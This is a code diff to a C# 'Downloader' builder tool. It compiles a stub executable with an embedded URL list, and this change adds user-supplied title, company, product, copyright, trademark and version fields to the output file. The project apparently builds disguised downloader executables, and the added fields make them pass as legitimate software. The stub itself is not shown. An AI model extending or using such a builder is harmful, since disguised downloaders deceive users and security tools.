@@ -64,7 +64,20 @@ namespace Downloader
                 _Save_File_Dialog.Filter = "Executable (*.exe)|*.exe";
                 _Save_File_Dialog.ShowDialog();
 
-                new Compiler().Build(Properties.Resources.Stub.Replace("\"#URL#\"", string.Join(", ", Data._URL_List.Select(x => $"\"{x}\"").ToList())), _Save_File_Dialog.FileName);
+                var _Stub = Properties.Resources.Stub
+                    .Replace("\"#URL#\"", string.Join(", ", Data._URL_List.Select(x => $"\"{x}\"").ToList()))
+                    .Replace("#Title#", textBox1.Text)
+                    .Replace("#Description#", textBox2.Text)
+                    .Replace("#Company#", textBox3.Text)
+                    .Replace("#Product#", textBox4.Text)
+                    .Replace("#Copyright#", textBox5.Text)
+                    .Replace("#Trademark#", textBox6.Text)
+                    .Replace("#v1#", numericUpDown1.Text)
+                    .Replace("#v2#", numericUpDown2.Text)
+                    .Replace("#v3#", numericUpDown3.Text)
+                    .Replace("#v4#", numericUpDown4.Text);
+
+                new Compiler().Build(_Stub, _Save_File_Dialog.FileName);
 
                 MessageBox.Show("Done!");
             }
